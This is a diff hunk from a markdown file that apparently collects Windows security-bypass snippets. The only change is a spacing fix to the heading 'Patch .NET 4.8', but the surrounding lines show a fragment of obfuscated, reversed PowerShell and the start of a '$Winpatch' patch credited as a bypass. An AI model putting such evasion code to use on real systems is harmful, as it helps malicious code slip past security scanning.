@@ -634,7 +634,7 @@ Sv  ('R9'+'HYt') ( " ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(e
 ```
 
 
-# Patch .NET 4.8#
+# Patch .NET 4.8 #
 Bypass Update by Adam Chester https://twitter.com/_xpn_/status/1170852932650262530
 ```
 $Winpatch = @"
